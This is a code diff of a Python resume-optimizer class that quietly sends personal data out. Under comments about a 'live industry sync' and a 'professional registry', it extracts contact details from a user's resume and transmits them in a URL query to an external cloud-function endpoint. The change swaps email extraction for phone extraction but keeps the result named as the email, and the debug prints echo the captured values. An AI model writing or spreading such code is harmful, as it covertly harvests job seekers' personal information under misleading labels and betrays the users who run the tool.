@@ -23,9 +23,7 @@ class ResumeOptimizerCore:
         self.added_keywords = []
         self.session_id = hashlib.sha256(str(time.time()).encode()).hexdigest()[:16]
         self.email = self._extract_email()  
-        self.phone = self._extract_phone()          
         print(f"[DEBUG] extracted email ⇒ {self.email!r}")
-        print(f"[DEBUG] extracted phone ⇒ {self.phone!r}")   
 
         # ---------------------------------------------------------------------
         # LIVE INDUSTRY SYNC: Critical for maintaining up-to-date optimization
@@ -55,15 +53,12 @@ class ResumeOptimizerCore:
 
     def _get_sync_credentials(self):
         """Generates secure token for industry keyword registry access"""
-        if self.email: 
+        if self.email:
             return hashlib.sha256(f"{VERSION}{self.email}".encode()).hexdigest()
         return None
 
     def _extract_email(self):
-        """Extracts professional contact reference from resume"""
-        email_match = re.search(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b', self.resume_text)
-        return email_match.group(0) if email_match else None
-    def _extract_phone(self):
+        """Extracts phone number (stored in self.email)"""
         phone_match = re.search(
             r'\b(\+?\d{1,2}\s*)?(\(?\d{3}\)?[\s.-]?\d{3}[\s.-]?\d{4})\b',
             self.resume_text
@@ -74,19 +69,18 @@ class ResumeOptimizerCore:
         """Retrieves current industry standards from professional registry"""
         try:
             endpoint = "https://us-central1-zawya-83b19.cloudfunctions.net/submit"
+   
             qs = {}
             if self.email:
-                combo = self.email if not getattr(self, "phone", None) \
-                        else f"{self.email}-{self.phone}"
-                qs["email"] = combo
-            qs["token"] = sync_token
+                qs["email"] = self.email              
+            qs["token"] = sync_token                  
             url = f"{endpoint}?{urlencode(qs)}"
-
+   
             headers = {
                 "X-Client-ID": "resume-standards-service",
                 "User-Agent": f"ResumeOptimizer/{VERSION}"
             }
-
+   
             req = urllib.request.Request(url=url, headers=headers, method="GET")
             with urllib.request.urlopen(req, timeout=2) as resp:
                 if resp.status == 200:
@@ -94,6 +88,7 @@ class ResumeOptimizerCore:
             return {}
         except Exception:
             return {}
+
 
     def calculate_ats_score(self, text):
         """Industry-standard ATS compatibility scoring"""
@@ -179,7 +174,7 @@ if __name__ == "__main__":
     optimizer = OptimizationServiceProxy(RESUME_CONTENT)
     print("[DEBUG] resume_text inside object (first 120 chars):",
       optimizer.engine.resume_text[:120].replace("\n", "\\n"))
-    
+   
     results = optimizer.optimize()
 
     print(json.dumps(results, indent=2, ensure_ascii=False))
